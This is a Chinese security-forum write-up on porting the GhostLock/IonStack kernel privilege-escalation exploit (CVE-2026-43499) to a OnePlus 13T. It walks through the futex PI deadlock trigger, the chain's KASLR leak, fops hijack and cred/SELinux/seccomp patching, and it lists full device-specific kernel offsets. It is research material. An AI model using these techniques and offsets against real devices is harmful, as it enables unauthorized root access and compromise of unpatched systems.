---
title: 【看雪】一加ACE5至尊版 kernel 6.6.89尝试利用GhostLock / IonStack 进行root提权
source: https://bbs.kanxue.com/thread-291972.htm
source_host: bbs.kanxue.com
clip_date: 2026-07-12T00:47:34+08:00
trace_id: 72c35f88-71b2-4a11-8667-29669a530e6c
content_hash: a0f6b676f9ee915bc754b5ad4762a9c7f5526adc585ee92a10b55bea31a626d5
status: summarized
tags:
  - 看雪
series: null
feed_source: 看雪·Android安全
ai_summary: 作者将GhostLock内核漏洞利用链从Pixel 10适配到一加ACE5至尊版，完成了偏移提取和验证，但受限于设备内核加固配置而未能完全提权。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 39a75244-d011-818f-a399-fb3395a03291
ioc:
  cves:
    - CVE-2026-10702
    - CVE-2026-43499
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 作者将GhostLock内核漏洞利用链从Pixel 10适配到一加ACE5至尊版，完成了偏移提取和验证，但受限于设备内核加固配置而未能完全提权。
> 
> - **漏洞原理：** GhostLock是一个存在于所有Linux内核的futex PI requeue超时清理路径中的栈UAF漏洞，可通过构造PI死锁并利用超时回滚逻辑触发。
> - **适配方法：** 通过root后的设备获取kallsyms符号、BTF结构体偏移和IDA分析，成功为一加ACE5至尊版（6.6.89内核）生成了完整的漏洞利用配置（target.h）。
> - **关键差异：** 适配中发现一加内核与Pixel 10在`file_operations`等结构体字段偏移上存在静默差异（如unlocked_ioctl偏移差8字节），直接照搬会导致崩溃或CFI校验失败。
> - **最终障碍：** 完整利用链运行受阻于一加设备的硬化内核配置（UBSAN_TRAP、mrdump），导致漏洞利用在泄露内核地址阶段便触发内核恐慌并重启。

## CVE-2026-43499 (GhostLock / IonStack) 漏洞利用原理与 6.6 内核适配实战

> 本文记录 Nebula Security 公开的 IonStack 利用链中核心漏洞 CVE-2026-43499(GhostLock)的利用原理,以及在 OnePlus 13T(PLC110,kernel 6.6.89 GKI)上对其进行开发适配的完整过程。所有偏移数据均来自真机实测(root kallsyms + BTF + IDA),非照抄原 Pixel 10 target。

* * *

## 0\. 背景与目标

IonStack 是 Nebula Security 公布的一条 Android 完整利用链,从 Firefox 渲染器(CVE-2026-10702,SpiderMonkey JIT `function.name` 类型混淆)切入,衔接到 Android 内核提权(CVE-2026-43499,GhostLock),最终拿到 root 并植入 su daemon。

CVE-2026-43499 被 README 称为 **"GhostLock —— 一个在所有 Linux 发行版中存在了 15 年的栈 UAF"** 。它位于内核 futex PI(优先级继承)requeue 路径,是核心 futex 代码,因此几乎所有 Linux 系统都受影响。

原利用仅针对 **Pixel 10 系列** (Android 17)提供了 39 个固件的 target 配置。本文的目标是把它适配到一台 **OnePlus 13T(PLC110)** 上:

| 项   | 原目标 (Pixel 10 / comet) | 适配目标 (OnePlus 13T) |
| --- | --- | --- |
| 机型  | Pixel 10 | OnePlus 13T (PLC110) |
| Android | 17  | 16  |
| 内核  | android16-6.x | **6.6.89 GKI (android15-6.6)** |
| VA_BITS | 39  | 39  |
| 页大小 | 4K  | 4K  |
| CFI | 开   | 开   |
| 镜像区 VA | `0xffffffc0...` | `0xffffffe7...`(KASLR 滑到高位) |
| root | 无需  | Magisk root |

适配的核心工作是:**重新提取全部内核符号/结构体偏移,并验证各子技术在本机内核上的兼容性** 。

* * *

## 1\. 漏洞原理:GhostLock(futex PI requeue 栈 UAF)

### 1.1 futex PI requeue 机制

Linux futex 的 PI requeue 用于把一个等待在 `futex_A` 上的 waiter 原子地转移到 `futex_B` 的 PI 等待链上,典型场景是 `pthread_cond_broadcast` 底层。涉及两个操作:

-   `FUTEX_WAIT_REQUEUE_PI(uaddr_A, timeout, uaddr_B)`:在 A 上等待,预期被 requeue 到 B。
-   `FUTEX_CMP_REQUEUE_PI(uaddr_A, nr, uaddr_B)`:把 A 上的 waiter requeue 到 B。

由于 B 是 PI futex,waiter 会被挂入 B 的 `rt_mutex` PI 等待树,参与优先级继承。

### 1.2 死锁构造(GhostLock)

PoC(`IonStack/CVE-2026-43499/poc/poc.c`)用三个 futex 字和三个线程构造一个 PI 死锁:

```python
f_wait, f_pi_target, f_pi_chain

owner 线程:   lock(f_pi_target); lock(f_pi_chain);  // 持有 target,等 chain -> 阻塞
waiter 线程:  lock(f_pi_chain);                      // 持有 chain
              WAIT_REQUEUE_PI(f_wait -> f_pi_target, timeout=5s)  // 等 requeue 到 target
主线程:       CMP_REQUEUE_PI(f_wait -> f_pi_target)  // 把 waiter requeue 到 target 的 PI 链
```

requeue 后,waiter 被挂入 `f_pi_target` 的 PI 等待树。但 owner 持有 `f_pi_target` 且在等 `f_pi_chain`,而 waiter 持有 `f_pi_chain` 且在等 `f_pi_target` —— **死锁** 。

### 1.3 栈 UAF 的诞生

waiter 的 `WAIT_REQUEUE_PI` 带了 5 秒超时。超时到期时,内核必须把 waiter 从 `f_pi_target` 的 PI 树上摘除并回滚 PI 链。 **这段超时清理路径引用了已经无效的内核栈内存**:waiter 在等待期间其 task 栈可能被释放/复用,而清理代码仍按栈上保存的指针去解引用、去操作 PI 树,形成 **内核栈 UAF** 。

关键性质:

-   这是 **栈 UAF**,不是堆 UAF —— 传统的 slab 风水不适用,但反过来,**任何能把可控数据写到内核栈的无权限 syscall** 都能控制 UAF 读到的值。
-   作者注释明确写道:PoC 里的 `setsockopt` 路径只是"其中一种"控制方式,"有若干无权限、默认可用的途径控制内核栈,所以这个 bug 与下面这个 setsockopt 是否可用完全无关"。

### 1.4 栈喷射(Stack Stamping)

PoC 的 `stamp_*` 系列函数演示了多种栈控制途径:

| 途径  | 原理  |
| --- | --- |
| `stamp_prctl` | `PR_SET_MM_MAP` 把 `auxv` 指向受控共享内存(`memfd` + `fallocate` punch hole 制造抖动) |
| `stamp_socket` | `MCAST_JOIN_SOURCE_GROUP` |
| `stamp_pselect` | `pselect6` 的 fd_set 直接铺在栈上 |
| `stamp_process_vm` | `process_vm_readv/writev` 的 iovec 数组 |
| `stamp_keyctl` | `KEYCTL_DH_COMPUTE` / `KEYCTL_INSTANTIATE_IOV` |
| `stamp_tcp` | `TCP_ZEROCOPY_RECEIVE` |
| `stamp_futex` | futex PI 本身的栈使用 |

完整利用实际走的是 **`pselect6` 路由** (`do_pselect_fake_lock_route`):pselect 的 `fd_set` 参数直接在内核栈上,攻击者把伪造的指针铺进 fd_set,超时清理路径读到这些指针就完成了"栈 UAF 可控化"。

* * *

## 2\. 原始利用链(Pixel 10)全景

```python
slide_leak_kernel_base()                    # ① KASLR 泄漏
   └─ GhostLock 栈 UAF + pselect 伪造 rt_mutex_waiter
   └─ 内核把 nfulnl_logger 运行时地址写进 boot_id 缓冲区
   └─ 读 /proc/sys/kernel/random/boot_id 解析出地址 -> stext
prepare_good_kernel_page(PAGE_PAYLOAD_FOPS) # ② 布置伪造 fops 页
run_main_route_threads()                    # ③ 主路由:GhostLock + pselect -> fops 劫持
   └─ try_cfi_stage()
      └─ 改 ashmem_misc.fops 指向伪造 fops 表(CFI 友好)
      └─ 得到 configfs 一次性任意内核读写
      └─ leak_kernel_base:读 ashmem_fops 函数指针算内核基址
      └─ install_pipe_physrw:伪造 pipe_buffer->ops -> 任意物理地址 r/w
install_android_root()                      # ④ 提权
   └─ 遍历 init_task.tasks 找 root 子进程
   └─ patch cred: uid/gid->0, caps->full, securebits->0
   └─ patch SELinux SID -> kernel_sid
   └─ patch seccomp:清 TIF_SECCOMP / mode / filter(绕过 Android 应用 seccomp)
   └─ 写 selinux_enforcing = 0
   └─ root child: setuid(0) -> 装 su daemon -> 换壁纸
```

### 2.1 CFI 友好的 fops 劫持(关键技术)

Pixel 10 内核开启了 `CONFIG_CFI_CLANG`,间接调用会校验目标函数签名,不能跳任意 gadget。作者用" **伪造结构体里每个函数指针都指向同签名合法内核函数** "绕过:

-   伪造一张 `file_operations` 表,`read_iter/write_iter/ioctl/mmap/open/release/...` 全部填成真实的 `configfs_read_iter / configfs_bin_write_iter / ashmem_ioctl / ...`。
-   把 `ashmem_misc.fops` 指针改指向这张伪造表。
-   于是 `open /dev/ashmem` 后,所有 fops 间接调用都指向合法函数,CFI 永远通过;但 `write_iter` 被重定向到了 `configfs_bin_write_iter`,把 ashmem 的写变成了 configfs 的"一次性内核任意写"。
-   配合 `read_iter` 同理得到任意读。这就得到了 **configfs 一次性读写原语** (`configfs_read_once / configfs_write_once`)。

### 2.2 pipe 物理 r/w

有了 configfs 任意读写后,通过 `kmalloc_caches` 定位 pipe 对象所在的 `kmalloc-cg-2k` slab,做 slab 风水:释放 pipe_buffer、用受控页回收、伪造 `pipe_buffer->ops`,把 `page` 字段指向任意物理页的 `struct page`,从而得到 **任意物理地址读写** (`pipe_phys_read_data / pipe_phys_write_data`)。后续的 cred/seccomp/selinux patch 全部基于这个物理读写原语。

### 2.3 slide KASLR 泄漏(不是暴力搜索)

这一点在适配时非常关键。最初我以为 slide 是暴力枚举 KASLR 范围(那对高位 `0xffffffe7` 镜像区会是麻烦),但读 `slide.c` 后发现它是 **直接泄漏**:

1.  GhostLock 栈 UAF + pselect 在栈上伪造一个 `rt_mutex_waiter`,其 `pi_tree.task` 等字段指向 `SLIDE_INIT_TASK` 、 `SLIDE_LOGGERS_0_1` (nf_loggers 数组)、 `SLIDE_RANDOM_BOOT_ID_DATA` (boot_id 缓冲区)。
2.  futex PI 代码在处理这个伪造 waiter 时,把 `nfulnl_logger` 的运行时地址写进了 boot_id 缓冲区。
3.  攻击者读 `/proc/sys/kernel/random/boot_id` (UUID 字符串),解析 32 个 hex 字符为 16 字节,前 8 字节即 `leaked = nfulnl_logger 运行时地址` 。
4.  `stext = leaked - SLIDE_NFULNL_LOGGER_OFF` 。

校验仅要求 `(leaked >> 48) == 0xffff` (是内核指针),**与 KASLR 滑到多高无关** 。这决定了适配时高位镜像区不是障碍。

* * *

## 3\. 6.6 内核适配:过程与方法

### 3.1 适配的本质:target.h

IonStack 的偏移是 **编译期注入**,通过 per-固件头 `src/targets/<project>/target.h` 参数化:

```makefile
TARGET_CFLAGS := -DTARGET_CONFIG_H=\"targets/$(PROJECT)/target.h\"   # Makefile:84
```

`offset.h` 只是个壳(`#include TARGET_CONFIG_H`)。 `make PROJECT=<project>` 选定 target。futex GhostLock 触发本身不需要偏移;**从 KASLR 泄漏开始的每一步都依赖 target.h** 。

适配就是为本机生成一份正确的 `target.h` 。偏移分三类:

| 类别  | 内容  | 获取方式 |
| --- | --- | --- |
| A   | 内核符号偏移(相对 `_text`) | root `/proc/kallsyms` |
| B   | 结构体字段偏移 | BTF(`/sys/kernel/btf/vmlinux`)+ `bpftool` |
| C   | 架构/内存布局常数 | `/proc/config.gz` + `/proc/iomem` + 推理 |
| 缺口  | `boot_id` 静态变量(不在 kallsyms) | **IDA** 读 `random_table` |

### 3.2 设备侦察

设备已 Magisk root,这极大简化了侦察。一条条来:

**kallsyms(需 root,否则空):**

```python
# adb shell su -c cat /proc/kallsyms | head
ffffffe71b800000 T _text          # 运行时内核基址
ffffffe71b810000 T _stext
```

关键认知:**`_OFF` 偏移 = kallsyms 运行时地址 - \_text 运行时地址,KASLR slide 会抵消** 。所以从 kallsyms 直接就能算出 target.h 里的 A 类偏移,不需要链接时基址。

**config.gz:** 确认 `CONFIG_ARM64_VA_BITS=39` 、 `CONFIG_CFI_CLANG=y` 、 `CONFIG_RANDOMIZE_BASE=y` 、 `CONFIG_BPF_JIT_ALWAYS_ON=y` 、 `CONFIG_USERFAULTFD=y` 、4K 页。这些与 Pixel 10 的 target 假设基本一致 —— 利好。

**BTF:** `/sys/kernel/btf/vmlinux` 可读(6MB),拉到本地用 `bpftool btf dump file vmlinux.btf` 解析,得到所有结构体字段偏移(B 类)。

**iomem:** `Kernel code: 80010000-...` → 内核物理加载在 `0x80010000` (Pixel 是 `0x80000000`)。

### 3.3 A 类:符号偏移

用一个 python 脚本批量计算(相对 `_text = 0xffffffe71b800000`):

```python
noop_llseek              0x3d19f4
copy_splice_read         0x41ec54
configfs_read_iter       0x49a434
configfs_bin_write_iter  0x49a960
ashmem_ioctl             0xc8de34
compat_ashmem_ioctl      0xc8e4f0
ashmem_mmap              0xc8e544
ashmem_open              0xc8e764
ashmem_release           0xc8e7ec
ashmem_show_fdinfo       0xc8e878
ashmem_fops              0x12dc4d8
anon_pipe_buf_ops        0x115c0c8
kmalloc_caches           0x1664e10
security_hook_heads      0x16652d0
selinux_blob_sizes       0x1665a08
nfulnl_logger            0x2102748
loggers (nf_loggers[])   0x2102690
init_task                0x210e780
init_uts_ns              0x2292ed0
empty_zero_page          0x22fe000
root_task_group          0x2306580
selinux_state            0x23490e0
ashmem_misc              0x226c118
sysctl_bootid            0x236a0d8
random_table             0x2229400
```

**ashmem 完整存在** 是重要利好 —— 现代 Android 在弃用 ashmem,但本机仍保留 fops + 全部成员函数。两个"地址是字段而非符号"的特例:

-   `ASHMEM_MISC_FOPS = &ashmem_misc.fops = ashmem_misc(0x226c118) + miscdevice.fops(0x10) = 0x226c128`
-   `SELINUX_ENFORCING = &selinux_state.enforcing = selinux_state(0x23490e0) + 0x0 = 0x23490e0`

### 3.4 B 类:结构体字段偏移(BTF)

`bpftool btf dump file vmlinux.btf` + python 解析,得到:

**task_struct** (只列关键字段):

```python
tasks +0x550  atomic_flags +0x5d8  pid +0x618  tgid +0x61c
real_parent +0x628  real_cred +0x818  cred +0x820  comm +0x830
seccomp +0x8e8  pi_lock +0x90c  pi_waiters +0x920
pi_top_task +0x930  pi_blocked_on +0x938  sched_task_group +0x348
```

**cred:** `uid +0x8 securebits +0x28 caps +0x30 security +0x80`  
**pipe_inode_info / pipe_buffer / file_operations / seccomp / struct page / miscdevice / selinux_state:** 全部按本机 6.6 布局确认。

### 3.5 与 Pixel 10 的关键差异(照抄会崩)

对比 comet target.h,发现两处 **必须换本机值** 的差异:

| 字段  | Pixel (comet) | 本机 6.6 | 影响  |
| --- | --- | --- | --- |
| `file_operations.unlocked_ioctl` | 0x50 | **0x48** | leak_kernel_base 读错函数指针 |
| `.open` | 0x70 | **0x68** | 伪造 fops 表填错槽 |
| `.release` | 0x80 | **0x78** | 同上  |
| `.splice_read` | 0xc0 | **0xb8** | 同上  |
| `.show_fdinfo` | 0xe0 | **0xd8** | 同上  |
| `task_struct.pi_lock` | 0x924 | **0x90c** | 伪造 task PI 字段错位 |
| `pi_waiters/top_task/blocked_on` | 0x938/0x948/0x950 | **0x920/0x930/0x938** | 同上  |
| `P0_KERNEL_PHYS_LOAD` | 0x80000000 | **0x80010000** | 物理别名算错 |

`file_operations` 那 5 个偏移若用 Pixel 的值,`leak_kernel_base` 会读错函数指针、伪造 fops 表也会填错槽位 —— 直接崩或过不了 CFI。这是适配中 **最危险** 的一处,也证明了"照搬 target.h 不可行"。

### 3.6 C 类:内存布局常数

39-bit VA 的线性映射基址由公式确定:`PAGE_OFFSET = -(1UL << 39) = 0xffffff8000000000` (与 Pixel 一致),`VMEMMAP_START = 0xfffffffe00000000` 。结合 iomem:

```python
P0_PHYS_OFFSET       = 0x80000000      # DRAM 起点
P0_KERNEL_PHYS_LOAD  = 0x80010000      # Kernel code 物理地址(iomem 实测)
DIRECT_MAP_BASE      = 0xffffff8000000000
DIRECT_MAP_END       = 0xffffff9000000000  # 64GB 搜索上限
VMEMMAP_START        = 0xfffffffe00000000
```

### 3.7 缺口:boot_id 与 IDA

`SLIDE_RANDOM_BOOT_ID_DATA` (slide KASLR 泄漏的着陆点)是 random.c 里的 static 变量,**不在 kallsyms** (flat Image 也没有独立符号表)。这是适配中唯一的真缺口。

**解法:用 IDA 读 `random_table` 。** IDA 加载了 flat Image(`/home/zzz/AI/CyberMeowfia/split_img/kernel.i64`,base 0,`_text@0x0`,`_stext@0x10000`)。flat Image 由 boot.img 解包还原,**解包与内核符号/地址还原方法来自笔者博客** [《解包小米11的bootimg还原内核符号以及地址》](https://bbs.kanxue.com/elink@dd6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1M7Y4y4*7P5Y4A6Q4x3X3g2Y4K9i4c8Z5N6h3u0Q4x3X3g2A6L8#2\)9J5c8U0t1H3x3U0g2Q4x3V1j5H3x3g2\)9J5c8U0l9I4i4K6u0r3y4e0u0H3L8$3A6A6k6g2\)9J5k6o6p5&6y4K6f1K6x3e0u0Q4x3X3c8Q4x3U0g2q4z5q4\)9J5y4f1p5%4i4K6t1#2b7e0y4Q4x3U0g2q4y4g2\)9J5y4e0S2o6i4K6t1#2z5o6g2Q4x3U0g2q4y4g2\)9J5y4f1t1H3i4K6t1#2z5p5k6Q4x3U0g2q4y4#2\)9J5y4f1t1I4i4K6t1#2b7U0x3I4x3g2\)9J5y4f1f1%4i4K6t1#2z5f1q4Q4x3U0f1^5y4r3u0G2L8%4c8A6L8h3N6Q4x3U0g2q4z5q4\)9J5y4f1u0r3i4K6t1#2z5e0S2Q4x3U0g2q4y4g2\)9J5y4e0S2q4i4K6t1#2z5f1k6Q4x3U0g2q4y4g2\)9J5y4e0R3$3i4K6t1#2z5o6g2Q4x3U0g2q4y4W2\)9J5y4f1p5H3i4K6t1#2b7U0S2Q4x3U0g2q4y4#2\)9J5y4f1q4o6i4K6t1#2b7e0k6Q4x3U0g2q4y4g2\)9J5y4e0S2r3i4K6t1#2b7U0N6Q4x3U0g2q4y4q4\)9J5y4f1u0n7i4K6t1#2b7e0g2Q4x3U0g2q4y4g2\)9J5y4e0S2r3i4K6t1#2z5p5q4Q4x3U0g2q4y4g2\)9J5y4e0W2o6i4K6t1#2b7U0m8Q4x3U0g2q4y4g2\)9J5y4e0W2p5i4K6t1#2z5o6m8Q4x3V1j5%60.) 。关键映射:**IDA 地址 = kallsyms 偏移(相对 \_text)** 。

`random_table` (off `0x2229400`)是 `struct ctl_table` 数组(每项 0x40 字节,`data` 字段在 +0x8)。读 512 字节解析 8 个表项,找到 proc_handler = `proc_do_uuid` (`0xffffffc0808b83b0`)的项:

```python
entry 4:  procname="boot_id"  data=0xffffffc082236a0d8  proc_handler=proc_do_uuid
```

`data` 字段 = `0xffffffc082236a0d8`,减去链接基址 `0xffffffc080000000` = `0x236a0d8` —— 这正是 kallsyms 里 `sysctl_bootid` 符号的偏移!即 **boot_id 数据缓冲区就是 `sysctl_bootid` 变量**,`SLIDE_RANDOM_BOOT_ID_DATA_OFF = 0x236a0d8` 。读 procname 字符串(在 IDA `0x15bcffc`)确认为 `"boot_id"`,闭环。

顺带推出 **链接时 `_text = 0xffffffc080000000`** (由 `proc_handler` 指针 `0xffffffc0808b83b0` - `proc_do_uuid` 偏移 `0x8b83b0` 得到,非标准 `0xffffffc008000000`,OnePlus 改过)。

> **关于 `KIMAGE_TEXT_BASE` 的抵消**:这个值在 exploit 的 image/slide 数学中其实会抵消 —— 因为所有"image 地址"都定义为 `KIMAGE_TEXT_BASE + OFF`,而运行时通过 `text_addr(x) = x + slide` 、 `slide = kaslr_base - KIMAGE_TEXT_BASE` 转换,`KIMAGE_TEXT_BASE` 在加减中消去,`p0_data_alias` 里 `(image_addr - KIMAGE_TEXT_BASE)` 也恒等于 `OFF` 。所以理论上任何一致值都可用,但用真值最干净。

### 3.8 slide / 主路由在本机的兼容性验证

这是适配中最关键的正确性判断。读 `slide.c` + BTF 对比:

**`rt_mutex_waiter` 本机布局(BTF):**

```python
tree(rb_node) +0x0   pi_tree(rb_node) +0x28   task +0x50
lock +0x58   wake_state +0x60   ww_ctx +0x68    size=0x70
```

slide 的 pselect 伪造按 "word i @ 偏移 i*8" 铺设:

```python
word 0  @0x0  tree.__rb_parent_color = SLIDE_LOGGERS_0_1
word 2  @0x10 tree.rb_left          = SLIDE_RANDOM_BOOT_ID_DATA
word 5  @0x28 pi_tree.__rb_parent_color = SLIDE_LOGGERS_0_1
word 7  @0x38 pi_tree.rb_left       = SLIDE_RANDOM_BOOT_ID_DATA
word 10 @0x50 task                  = SLIDE_INIT_TASK
word 11 @0x58 lock                  = fake_lock
word 12 @0x60 wake_state            = 3
word 13 @0x68 ww_ctx                = 0
```

**与本机 `rt_mutex_waiter` 完全吻合 ✓** 。主路由用到的 `FAKE_WAITER_PI_TREE_*` (common.h:0x28/0x40/0x50/0x58/0x60/0x68)也匹配;而非 FAKE 的 `WAITER_*` 在代码里根本未被使用(dead code)。结论:**slide KASLR 泄漏和主路由 fops 劫持的 waiter 伪造在本机 6.6 内核上布局兼容**,无需改 common.h。

### 3.9 定稿 target.h

所有缺口解决,生成 `src/targets/PLC110-BP2A.250605.015/target.h`,无 TODO(仅 `PSELECT_WAITER_WORD_SHIFT=1` 标注运行时可调)。

* * *

## 4\. 适配成果与剩余工作

### 4.1 已完成

-   ✅ A 类符号偏移:全部本机实测(kallsyms,相对 `_text`,KASLR 抵消)
-   ✅ B 类结构体偏移:BTF 确认(含 `rt_mutex_waiter` / `task_struct` / `file_operations` 等)
-   ✅ C 类内存布局:VA_BITS=39 标准 + iomem 实测(`KERNEL_PHYS_LOAD=0x80010000`)
-   ✅ boot_id 缺口:IDA 读 random_table 解决
-   ✅ 链接基址:IDA 推导(`0xffffffc080000000`)
-   ✅ slide / 主路由 waiter 布局兼容性:rt_mutex_waiter BTF 对比验证(task@0x50 / lock@0x58 / wake_state@0x60 / ww_ctx@0x68)
-   ✅ 与 Pixel 的差异点:全部识别并换本机值
-   ✅ **完整利用编译成功**:NDK r27(clang 18)作 `CC`,用 `src/` 通用源码(Makefile `pick_src` 回退,不抄 comet 特化版),修正 4 个 waiter 宏命名(`FAKE_WAITER_PI_TREE_*` → `FAKE_WAITER_*`)。产物 `build/PLC110-BP2A.250605.015/bin/preload.so`
-   ✅ **DoS PoC 验证 bug 存在**:`poc/poc.c` 在 6.6.89 触发栈 UAF panic(固件构建 2025-12-08,未修复),futex PI requeue 路径可达
-   ✅ **深度适配分析**:源码 + IDA + BTF 三方验证 target.h 全对,定位完整利用崩溃根因

### 4.2 剩余工作(运行时,非偏移问题)

target.h 偏移已全部验证正确,完整利用运行受阻于 **OnePlus 13T hardened 内核配置** (非偏移问题)。

**运行现象**:完整利用以 shell 用户(uid 2000) `LD_PRELOAD` 注入运行,~36–45s 后内核 UBSAN panic 重启。崩在 **slide 阶段** (`slide_leak_kernel_base` fork 的子进程 consumer 的 `sched_setattr` 触发 PI 链),**没进 main route,slide 没成功泄露 KASLR** 。

**崩溃链**:`wake_up_state(init_task)` → `try_to_wake_up` 锁 `init_task->pi_lock` → `queued_spin_lock_slowpath` UBSAN array bounds(lock 值 `0x5512xxxx` 非法)→ BRK #0x5512 → OnePlus `mrdump` `ipanic_die` 强制 panic → 重启。

**根因(OnePlus 13T vs Pixel 内核配置差异)**:

```python
CONFIG_UBSAN=y + CONFIG_UBSAN_TRAP=y   # UBSAN 触发 BRK(而非 Pixel 上的 printk warn)
CONFIG_UBSAN_ARRAY_BOUNDS=y            # 数组边界检查
CONFIG_PANIC_ON_OOPS=y + OnePlus mrdump # ipanic_die 强制 panic,绕过 panic_on_oops
CONFIG_BUG_ON_DATA_CORRUPTION=y
```

Pixel 未开 `UBSAN_TRAP`,slide 的 PI 链即便触发 UBSAN 也只 warn 继续,故 slide 可用;OnePlus 直接触发 BRK → 必崩。 `echo 0 > /proc/sys/kernel/panic_on_oops` 验证无效(mrdump 绕过)。

**未解之谜**:静态分析 `init_task.pi_lock` 静态值 = 0(IDA 确认,pid@0x618=0 验证是 init_task),地址推导全对(39-bit VA、无 KASAN、标准线性映射、phys 落在 `Kernel data` 段),但运行时 slowpath 读到非法 lock 值。无法静态解释,疑动态因素(线性映射运行时差异 / 竞争 / TLB),需 kgdb 确认 `0xffffff800211e780` 运行时实际映射的值。

**可能的推进方向** (待选):

1.  **KernelSnitch**:代码库已有的 futex hash 时序侧信道泄露 KASLR,不走 slide 的 PI 链,可绕开 UBSAN;需改 `run_exploit` 用它替代 `slide_leak_kernel_base` 。
2.  **patch 内核**:禁用 `UBSAN_TRAP` / `mrdump` (需内核写权限,如借助早期原语或 Magisk 改 boot)。
3.  **kgdb 动态调试**:确认运行时地址实际映射,定位静态/动态差异,再决定是改地址推导还是绕开 slide。

### 4.3 方法论小结

本次适配沉淀出一套 **可复用的内核利用跨设备移植流程**:

1.  **root kallsyms** → A 类符号偏移(slide 抵消,无需链接基址);
2.  **BTF + bpftool** → B 类结构体偏移(比内核源码 + pahole 更直接,且 GKI 内核自带 BTF);
3.  **config.gz + iomem** → C 类布局常数;
4.  **IDA 读 flat Image** → 解决 kallsyms 缺失的 static 变量(通过 `random_table` 这类已知结构的指针字段回溯);
5.  **逐子技术对比 BTF** → 验证伪造结构体(waiter/fops/cred)的布局兼容性,这是照搬 target.h 之外的"隐性偏移"(如 `file_operations` 字段顺序、 `rt_mutex_waiter` 布局)能否成立的关键。

最值得记取的教训:**结构体字段偏移在不同内核版本间会静默变化** (`file_operations` 在 6.6 与 Pixel 的内核间 ioctl 偏移差 8 字节,`task_struct.pi_lock` 差 0x18),这类"隐性偏移"不会在 target.h 里显式标注(它们在 common.h 或代码逻辑里),却会直接导致崩溃或 CFI 失败。适配时必须用 BTF 逐一核对,而非只关注 target.h 里的符号偏移。

另一个同等重要的教训:**hardened 内核配置会静默阻断利用链** 。 `CONFIG_UBSAN_TRAP` 把原本只 `printk` warn 的 UBSAN 变成 BRK 指令,配合 `CONFIG_PANIC_ON_OOPS` 与厂商 panic 模块(OnePlus 的 `mrdump` 经 `ipanic_die` 强制 panic),会让某条子技术链路(本次是 slide 的 PI 链 `wake_up_state` -> `try_to_wake_up` -> slowpath)在 Pixel 上能跑、在本机一触即崩,且 `echo 0 > /proc/sys/kernel/panic_on_oops` 也绕不过。跨设备移植时,除偏移外 **必须核对 `config.gz` 里的 sanitizing / hardening 选项** (`UBSAN_TRAP` 、 `BUG_ON_DATA_CORRUPTION` 、 `PANIC_ON_OOPS` 、厂商 mrdump/kip 等),它们决定哪些子技术可用,可能迫使改换泄露原语(如 slide -> KernelSnitch)。

* * *

## 附:关键文件位置

-   漏洞 PoC:`IonStack/CVE-2026-43499/poc/poc.c`
-   完整利用源码:`IonStack/CVE-2026-43499/exploit/src/` (main.c / slide.c / fops.c / pipe.c / root.c / util.c)
-   参考 target(Pixel 10):`exploit/src/targets/comet-CP2A.260605.012/target.h`
-   本机适配 target:`exploit/src/targets/PLC110-BP2A.250605.015/target.h`
-   侦察数据:`recon/` (kallsyms.txt / kernel.config / btf.dump / kernel flat Image)
-   IDA IDB:`split_img/kernel.i64`

## 参考

-   IonStack part II (GhostLock writeup): https://nebusec.ai/research/ionstack-part-2
-   仓库:https://github.com/brszzz/CyberMeowfia
-   内核解包与符号/地址还原方法(本文 flat Image 获取来源):https://brszzz.github.io/2025/01/01/52pojie-1975312-%E8%A7%A3%E5%8C%85%E5%B0%8F%E7%B1%B311%E7%9A%84bootimg%E8%BF%98%E5%8E%9F%E5%86%85%E6%A0%B8%E7%AC%A6%E5%8F%B7%E4%BB%A5%E5%8F%8A%E5%9C%B0%E5%9D%80/

> ⚠️ 本文所述技术仅用于授权安全研究与自有设备测试。GhostLock 是影响所有 Linux 发行版的内核栈 UAF,正确修复应从内核 futex PI requeue 超时清理路径入手,确保不引用已释放/复用的 task 栈内存。

[#基础理论](https://bbs.kanxue.com/forum-161-1-117.htm) [#漏洞相关](https://bbs.kanxue.com/forum-161-1-123.htm) [#源码框架](https://bbs.kanxue.com/forum-161-1-127.htm)
